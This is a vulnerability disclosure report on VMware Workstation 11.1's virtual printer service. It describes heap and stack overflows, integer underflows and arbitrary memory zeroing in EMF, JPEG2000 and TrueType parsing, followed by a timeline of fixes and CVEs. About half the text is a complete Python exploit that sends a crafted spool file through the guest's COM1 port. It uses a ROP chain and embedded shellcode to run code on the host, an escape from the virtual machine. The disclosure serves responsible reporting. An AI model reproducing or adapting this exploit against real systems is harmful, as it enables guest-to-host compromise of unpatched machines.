<!-- read as: html -->
Escaping VMware Workstation through COM1

*Kostya Kortchinsky - Google Security Team*

[Exploit](https://docs.google.com/document/d/1sIYgqrytPK-CFWfqDntraA_Fwi2Ov-YBgMtl5hdrYd4/edit#heading=h.eafd6qeajz9q) [Video](https://drive.google.com/file/d/0B6P-iHujNOX2NVFMazBQY0kyUXM/view)

# Foreword

These bugs are subject to a 90 day disclosure deadline. If 90 days elapse without a broadly available patch, then the bug report will be made available to the public.

# Summary

VMware Workstation offers printer “virtualization”, allowing a Guest OS to access and print documents on printers available to the Host OS. On VMware Workstation 11.1, the virtual printer device is added by default to new VMs, and on recent Windows Hosts, the Microsoft XPS Document Writer is available as a default printer. Even if the VMware Tools are not installed in the Guest, the COM1 port can be used to talk to the Host printing Proxy.

vprintproxy.exe is launched on the Host by vmware-vmx.exe as whichever user started VMware. vmware-vmx.exe and vprintproxy.exe communicate through named pipes. When writing to COM1 in the Guest, the packets will eventually end up in vprintproxy.exe for processing.

I won’t go over the subtleties of the protocol, but basically the printer virtualization layer is a glorified file copy operation of EMFSPOOL files from the Guest to the Host. The EMFSPOOL and contained EMF files are processed on the Host by vprintproxy.exe, and can be previewed on the Host thanks to TPView.dll. By supplying specially crafted EMFSPOOL and EMF files to COM1, one can trigger a variety of bugs in the vprintproxy.exe process, and achieve code execution on the Host.

# Environment

The rest of this document assumes a Windows 8.1 amd64 Host, a Windows 7 x86 Guest running under VMware Workstation 11.1, with all patches installed. Other platforms have not been investigated.

A fully working exploit is provided for this particular environment.

# Integer underflows when processing custom EMR

The function CTPViewDoc::WriteEMF in TPView.dll pre-processes an EMF and rewrites it, replacing a couple of custom EMR record types. In the case of an EMR of type 0x8000 and 0x8002, the program will allocate memory based on the size specified for the record, then copy the 8 bytes of the record, subtract 8 to the size and read from the file into the dynamically allocated buffer that amount of bytes. For an EMR record size strictly lower than 8, the subtraction will underflow and result in a heap overflow.

⟦picture 1⟧

…

⟦picture 2⟧

…

⟦picture 3⟧

This snippet of code doesn't ensure that the size of the record is at least 8. The integer underflow at (1) will make the program read a large number of bytes into a small buffer, resulting in a heap overflow.

A similarly vulnerable portion of code is handling custom EMR 0x8000.

# Multiple vulnerabilities when processing custom EMR 0x8002

In the case of custom EMR record 0x8002, TPView.dll blindly trusts sizes and offsets provided in the relevant structures and performs unsafe memcpy() operations.

⟦picture 4⟧

Here, both the contents of esi and ebx are under user’s control, and correspond to the contents of a custom 0x8002 EMR structure. The size of the memory allocated for ebx is not even checked to be at least 0x50 bytes. This results in some heap overflow conditions, as well a relative memory overwrite.

# Multiple vulnerabilities when processing custom EMR 0x8000

The custom EMR 0x8000 appears to hold a structure describing a JPEG2000 compressed image. There are several integer overflows when computing the size of a dynamically allocated chunk of memory, that can result in heap overflow conditions.

⟦picture 5⟧

The program performs unsafe 32-bit arithmetic, leading to an invalid size check prior to a memcpy() operation, leading to a heap overflow. The size allocated for that memory check is itself prone to a wrap due to the previous arithmetic operations, as well as the following addition that also might wrap the 32-bit integer:

⟦picture 6⟧

# Stack overflow when processing a JPEG2000

This vulnerability looks conspicuously like CVE-2012-0897, and it might very well be that the same JPEG2000 library was used in both cases but has been left unpatched in TPView.dll for the last couple of years. Anyway, when processing record 0xff5c (Quantization Default), a user can trigger an overflow of a stack based buffer in a function without a stack cookie - which leads to direct EIP control.

⟦picture 7⟧

Here, the JPEG2000 parser will just read words as long as the size of the 0xff5c record permits it, while the destination buffer can only hold 0xc4 bytes at most.

# Multiple vulnerabilities in EMF record enumeration callback

The CEMF::EnhMetaFileProc function in TPView.dll is used as a callback to EnumEnhMetaFile, and applies some specific processing to several EMR types prior to “playing” them. The sanity of those records is poorly checked, leading to multiple out-of-bounds read or write operations.

⟦picture 8⟧

Here, the length of the EMR_SMALLTEXTOUT record is not checked to be at least 0x34 prior to operations being carried on fields of the structure.

⟦picture 9⟧

Same issue here for an EMR_EXTTEXTOUTW record.

# Arbitrary memory zeroing in TrueType font checksum verification

When extracting a TrueType font from the EMFSPOOL file, TPView.dll will verify the checksum of the font prior to further processing. To do so, it will walk the tables, zero out the padding at the end of a table and checksum the table. In doing so, it will trust the ‘offset’ field of the table record and add it to a pointer to the font buffer. While there is a check to make sure that we don’t go past the end of the font, nothing prevents us from referencing and zeroing memory prior to the font, as the 32-bit arithmetic will wrap.

⟦picture 10⟧

The above checks can be bypassed with a “negative” offset, leading to the following memset() and checksum:

⟦picture 11⟧

As a result, it is possible to zero 1 to 3 bytes (size of the padding) at an arbitrary location relative to the font buffer, as long as it’s located before.

# Additional security considerations

Even when running on a 64-bit platform, vprintproxy.exe is only available as a 32-bit process. It is to be noted that several modules loaded within vprintproxy.exe do not support ASLR, namely:

- iconv.dll
- TPClnt.dll
- TPClntloc.dll
- TPClnVM.dll
- TPView.dll

Since all those DLLs share the same image base of 0x10000000, only iconv.dll (the 1st to be loaded) will be located at this address. The others’ base will be randomized as their original loading address is unavailable.

Also the JPEG2000 parsing is done within a try-catch that catches all exceptions. This would allow an attacker to bruteforce his/her way to successful exploitation as the vprintproxy.exe would stay alive even through access violations.

# Identified mitigations

“Disconnect” the Virtual Printer, or remove it entirely in the VM settings, this will stop vprintproxy.exe from running.

# Document revisions

1.0: initial version

1.1: added the arbitrary zero memory within the TrueType font checksum

1.2: added the integer underflows in the custom EMR processing

# Timeline

3/5/2015: initial report sent to [security@vmware.com](mailto:security@vmware.com)

3/6/2015: VMware Security Response Center acknowledges the receipt of the report

3/12/2015: updated report sent

3/17/2015: VSRC sends the expected timeframe for fixes to be released

3/17/2015: updated report sent

3/18/2015: additional bugs sent to VSRC

4/10/2015: VMware communicates expected date for joint disclosure (6/9)

4/21/2015: VMware assigns 5 CVEs to the issues (CVE-2015-2336 to 2340)

6/9/2015: VMware releases Workstation [11.1.1](https://my.vmware.com/web/vmware/info/slug/desktop_end_user_computing/vmware_workstation/11_0) for Windows and [VMSA-2015-0004](https://www.vmware.com/security/advisories/VMSA-2015-0004.html)

# Exploit

The provided exploit achieves code execution in the vprintproxy.exe process running on the Host, triggering the JPEG2000 stack overflow by sending a crafted EMFSPOOL through COM1 in the Guest, which doesn’t require administrative privileges in the Guest.

Past the crafting of the EMFSPOOL and contained EMF and JPEG2000, the only difficulty was to create a ROP chain based on iconv.dll, as this DLL is fairly inconvenient for this purpose.

The exploit assumes iconv.dll version 1.9.0.1 and TPview.dll version 8.8.856.1, but since exceptions are caught by the JPEG2000 parser, additional targets can be supported through multiple tries.

```
from ctypes import *
from ctypes.wintypes import BYTE
from ctypes.wintypes import WORD
from ctypes.wintypes import DWORD
import sys
import struct
import binascii
import array
import zlib

class DCB(Structure):
    _fields_=[
        ('DCBlength',DWORD),
        ('BaudRate',DWORD),
        ('fBinary',DWORD,1),
        ('fParity',DWORD,1),
        ('fOutxCtsFlow',DWORD,1),
        ('fOutxDsrFlow',DWORD,1),
        ('fDtrControl',DWORD,2),
        ('fDsrSensitivity',DWORD,1),
        ('fTXContinueOnXoff',DWORD,1),
        ('fOutX',DWORD,1),
        ('fInX',DWORD,1),
        ('fErrorChar',DWORD,1),
        ('fNull',DWORD,1),
        ('fRtsControl',DWORD,2),
        ('fAbortOnError',DWORD,1),
        ('fDummy2',DWORD,17),
        ('wReserved',WORD),
        ('XonLim',WORD),
        ('XoffLim',WORD),
        ('ByteSize',BYTE),
        ('Parity',BYTE),
        ('StopBits',BYTE),
        ('XonChar',c_char),
        ('XoffChar',c_char),
        ('ErrorChar',c_char),
        ('EofChar',c_char),
        ('EvtChar',c_char),
        ('wReserved1',WORD),
    ]

class COMMTIMEOUTS(Structure):
    _fields_=[
        ('ReadIntervalTimeout',DWORD),
        ('ReadTotalTimeoutMultiplier',DWORD),
        ('ReadTotalTimeoutConstant',DWORD),
        ('WriteTotalTimeoutMultiplier',DWORD),
        ('WriteTotalTimeoutConstant',DWORD),
    ]

class TPVM:

    SERIAL_PORT=b'\\\\.\\COM1'

    def __init__(self):
        self.hPort=windll.kernel32.CreateFileA(self.SERIAL_PORT,
                                               0xc0000000, #GENERIC_READ|GENERIC_WRITE
                                               3, #FILE_SHARE_READ|FILE_SHARE_WRITE
                                               None,
                                               3, #OPEN_EXISTING
                                               0,
                                               None)
        if (self.hPort&0xffffffff)==0xffffffff:
            raise Exception('the serial port could not be opened (0x%08x)'%(GetLastError()))
        if not windll.kernel32.SetupComm(self.hPort,
                                         0x20000,
                                         0x84d0):
            raise WinError()
        dcb=DCB()
        dcb.DCBlength=0x1c
        dcb.BaudRate=0x1C200
        dcb.fBinary=1
        dcb.fOutxCtsFlow=1
        dcb.fDtrControl=2
        dcb.fRtsControl=2
        dcb.ByteSize=8
        dcb.fAbortOnError=1
        windll.kernel32.SetCommState(self.hPort,
                                     byref(dcb))
        commtimeouts=COMMTIMEOUTS()
        commtimeouts.ReadIntervalTimeout=0
        commtimeouts.ReadTotalTimeoutMultiplier=0
        commtimeouts.ReadTotalTimeoutConstant=20000
        commtimeouts.WriteTotalTimeoutMultiplier=0
        commtimeouts.WriteTotalTimeoutConstant=20000
        if not windll.kernel32.SetCommTimeouts(self.hPort,
                                               byref(commtimeouts)):
            raise WinError()

    def __write_packet(self,buffer):
        bytesWritten=DWORD(0)
        if not windll.kernel32.WriteFile(self.hPort,
                                         buffer,
                                         len(buffer),
                                         byref(bytesWritten),
                                         None):
            raise WinError()
        print('%d bytes written'%(bytesWritten.value))

    def __read_packet(self,n):
        buffer=c_buffer(n)
        bytesRead=DWORD(0)
        if not windll.kernel32.ReadFile(self.hPort,
                                        buffer,
                                        n,
                                        byref(bytesRead),
                                        None):
            raise WinError()
        print('%d bytes read'%(bytesRead.value))
        return buffer.raw

    def __write(self,buffer):
        while len(buffer)!=0:
            n=min(len(buffer),0x7ffd)
            self.__write_packet(struct.pack('<H',n)+buffer[:n])
            buffer=buffer[n:]

    def __read_1byte(self):
        b=self.__read_packet(1)
        if len(b)!=1:
            return 1
        return struct.unpack('<B',b)[0]

    def do_command(self,cmd):
        self.__write_packet(struct.pack('<H',cmd))
        if cmd==0x8002:
            return 0
        return self.__read_1byte()

    def do_data(self,d):
        self.__write(d)
        return self.__read_1byte()

    def close(self):
        windll.kernel32.CloseHandle(self.hPort)

def main(args):
    #some constants
    PRINTER_ID=1 #should probably be an argument really
    SHELLCODE=binascii.a2b_hex('e8000000005b8db31b010000568db313010000566a0268884e0d00e8170000006a008d832301000050ff931b0100006a00ff931f0100005589e55156578b4d0c8b75108b7d14ff36ff7508e813000000890783c70483c604e2ec5f5e5989ec5dc210005589e55356575164ff3530000000588b400c8b480c8b118b41306a028b7d085750e85b00000085c0740489d1ebe78b4118508b583c01d88b5878585001c38b4b1c8b53208b5b2401c101c201c38b32585001c66a01ff750c56e82300000085c0740883c20483c302ebe35831d2668b13c1e20201d10301595f5e5b89ec5dc208005589e551535231c931db31d28b45088a1080ca6001d3d1e30345108a0884c9e0ee31c08b4d0c39cb7401405a5b5989ec5dc20c00ea6f0000945d0300000000000000000063616c632e65786500') #Didier Stevens' winexec/exitthread
    WRITABLE=0x1010ff00 #end of the .idata section of iconv.dll
    BASE=0x40000000 #where we want the virtualalloc

    t=TPVM()
    t.do_command(0x8001)
    #header
    t.do_data(struct.pack('<20sIIII',('%d'%(PRINTER_ID)).encode('utf-8'),2,0xd,0,0))
    #jobheader
    t.do_data(binascii.a2b_hex('310001001400150016001700180021002f0030000000000063727970746f61640050494e42414c4c57495a415244000000'))

    ###############
    #emf
    emf=b''
    #emr_header
    emf+=struct.pack('<II',1,0x84)
    emf+=struct.pack('<IIII',0xf1,0xf2,0x130b,0x1855) #bounds
    emf+=struct.pack('<IIII',0,0,0x53fc,0x6cfc) #frame
    emf+=b' EMF' #record signature
    emf+=struct.pack('<I',0x10000) #version
    emf+=struct.pack('<IIHH',0,0,0,0) #bytes,records,handles,reserved
    emf+=struct.pack('<II',0xc,0x6c) #ndescription,offdescription
    emf+=struct.pack('<I',0) #npalentries
    emf+=struct.pack('<II',0x13ec,0x19c8) #device
    emf+=struct.pack('<II',0xd7,0x117) #millimeters
    emf+=struct.pack('<III',0,0,1) #cbpixelformat,offpixelformat,bopengl
    emf+=struct.pack('<II',0x347d8,0x441d8) #micrometersx,micrometersy
    emf+=('\0'*0xc).encode('utf-16le')
    #overflowing buffer
    o=b''
    o+=struct.pack('<I',0x1001c94c) #mov eax,edx&retn
    o+=struct.pack('<I',0x10110284) #target --.idata!_iob_func
    o+=struct.pack('<I',0x1001c594) #value --pop ecx&pop ecx&retn
    o+=struct.pack('<I',0x100010b1) #mov ebp,esp&push ecx& call ds:_iob_func
    o+=struct.pack('<I',0x1001c595) #pop ecx&retn
    o+=struct.pack('<I',0x1001c594) #pop ecx&pop ecx&retn
    o+=struct.pack('<I',0x1000cb5c) #dec eax&retn
    o+=struct.pack('<I',0x10003d43) #add [eax+1],edi&mov esp,ebp&pop ebp&retn
    o+=struct.pack('<I',0x10001116) #pop ebp&retn
    o+=struct.pack('<I',WRITABLE-8)
    o+=struct.pack('<I',0x1001c120) #mov eax,[ebp+8]&pop ebp&retn
    o+=struct.pack('<I',0x41414141) #
    o+=struct.pack('<I',0x100010b1) #mov ebp,esp&push ecx& call ds:_iob_func
    o+=struct.pack('<I',0x1001c595) #pop ecx&pop ecx&retn
    o+=struct.pack('<I',0x1001c594) #pop ecx&pop ecx&retn
    o+=struct.pack('<I',0x1001c1fc) #mov eax,[eax]&mov [esp],eax&retn
    o+=struct.pack('<I',0x42424242) #
    o+=struct.pack('<I',0x1001c7d6) #pop edi&pop esi&retn
    o+=struct.pack('<I',BASE)
    o+=struct.pack('<I',0x10000)
    o+=struct.pack('<I',0x3000) #MEM_COMMIT|MEM_RESERVE
    o+=struct.pack('<I',0x40) #PAGE_READWRITE_EXECUTE
    o+=struct.pack('<I',BASE+0x10) #edi
    o+=struct.pack('<I',0x43434343) #esi --not used
    o+=struct.pack('<I',0x1001cae4) #jmp ds:InterlockedExchange
    o+=struct.pack('<I',0x1001cae4) #jmp ds:InterlockedExchange
    o+=struct.pack('<I',BASE) #
    o+=struct.pack('<I',0x8b24438b) #
    o+=struct.pack('<I',0x1001cae4) #jmp ds:InterlockedExchange
    o+=struct.pack('<I',BASE+4) #
    o+=struct.pack('<I',0xa4f21470) #
    o+=struct.pack('<I',0x1001c595) #pop ecx&retn
    o+=struct.pack('<I',BASE+8) #
    o+=struct.pack('<I',0x01f3e9) #mov eax,[ebx+0x24]&mov esi,[eax+0x14]&jmp +0x13f
    o+=struct.pack('<I',0x1000) #ecx
    o+=struct.pack('<I',BASE) #
    ###print('len(o)=0x%08x'%(len(o))) #must be <0xc4
    o+=b'A'*(0xc4-len(o))
    o+=struct.pack('<I',0x1001cae4) #jmp ds:InterlockedExchange --first eip
    o+=struct.pack('<I',0x1001c595) #pop ecx&retn
    o+=struct.pack('<I',WRITABLE) #target
    o+=struct.pack('<I',0x000000f4) #value --esp offset
    o+=struct.pack('<I',WRITABLE) #writable --edx
    o+=struct.pack('<I',0x1001c595) #pop ecx&retn
    o+=struct.pack('<I',0x7fffffff) #
    o+=struct.pack('<I',0x1001cae4) #jmp ds:InterlockedExchange
    o+=struct.pack('<I',0x1001c1e0) #__alloca_probe
    o+=struct.pack('<I',WRITABLE) #target
    o+=struct.pack('<I',0x00078c48) #.idata!VirtualAlloc-@edi
    o+=struct.pack('<I',0x1001cae4) #jmp ds:InterlockedExchange
    while (len(o)-2)%6!=0: #padding to satisfy length requirements
        o+=b'Z'
    #jp2 contents --the code still parses the codestream if no valid header is present, so I skipped it
    j=b''
    j+=struct.pack('>H',0xff4f) #SOC marker
    j+=struct.pack('>HH',0xff51,0x29) #SIZ marker
    j+=struct.pack('>HIIIIIIII',0,1,9,0,0,1,9,0,0)
    j+=struct.pack('>HBBB',1,7,1,1)
    j+=struct.pack('>HH',0xff5c,3+len(o)) #QCD marker
    j+=struct.pack('>B',2) #sqcd
    for i in range(0,len(o),2): #switch the endianness of the words
        j+=struct.pack('>H',(o[i+1]<<8)+o[i])
    j+=struct.pack('>H',0xffd9) #EOC marker
    j+=b'\x90'*(0x200-len(j)) #unprocessed data
    j+=SHELLCODE
    j+=b'\xcc'*(0x10000-len(j)) #has to be at least 10000h long to avoid a read AV
    #custom 8000h record
    r=b''
    r+=b'A'*0x28
    r+=struct.pack('<I',0x50)
    r+=b'B'*0x1c
    r+=struct.pack('<IIII',0x43434343,0x10,0x10,0x44444444)
    r+=b'E'*0x18
    r+=j
    emf+=struct.pack('<II',0x8000,len(r)+8)+r #type,size
    #emr_eof
    emf+=struct.pack('<IIIII',0xe,0x14,0,0x10,0x14)
    emf=emf[:0x30]+struct.pack('<IIH',len(emf),3,1)+emf[0x3a:]
    #devmode
    dm=binascii.a2b_hex('7000720069006e00740065007200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001040005dc0008040fff010001000100de0a66086400010007005802020001005802010001004c006500740074006500720000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000545045580f020000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000010110141e000e1464000614f401060f00000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005450504405000000')
    dm=b'%%EMF'+struct.pack('<BI',2,len(dm)+5)+dm
    #emf_spool
    h=struct.pack('<II',0x10,0)+'Google\0'.encode('utf-16le')+struct.pack('<HII',0xdead,0xc,len(emf))
    h=struct.pack('<II',0x10000,len(h))+h
    #emri_metafile_ext
    f=struct.pack('<IIII',0xd,8,len(emf)+8,0) #"offset is counted backward"
    e=dm+h+emf+f
    d=zlib.compress(e,9)
    d=struct.pack('<II',len(d),len(e))+d
    d=struct.pack('<H',0)+d
    ###############
    t.do_data(d)
    t.do_command(0x8002)
    t.close()

if __name__=='__main__':
    main(sys.argv)
```
<!--
picture 1 at 2507: image/png 13619 bytes, 624x101, width 0.87
picture 2 at 2513: image/png 17049 bytes, 624x135, width 0.87
picture 3 at 2519: image/png 20391 bytes, 624x156, width 0.87
picture 4 at 3029: image/png 33740 bytes, 624x372, width 0.87
picture 5 at 3637: image/png 28019 bytes, 624x347, width 0.87
picture 6 at 3965: image/png 10445 bytes, 446x141, width 0.62
picture 7 at 4416: image/png 22083 bytes, 591x266, width 0.82
picture 8 at 4928: image/png 21096 bytes, 458x280, width 0.64
picture 9 at 5077: image/png 33453 bytes, 624x368, width 0.87
picture 10 at 5731: image/png 32615 bytes, 557x380, width 0.77
picture 11 at 5842: image/png 19867 bytes, 543x238, width 0.75
-->
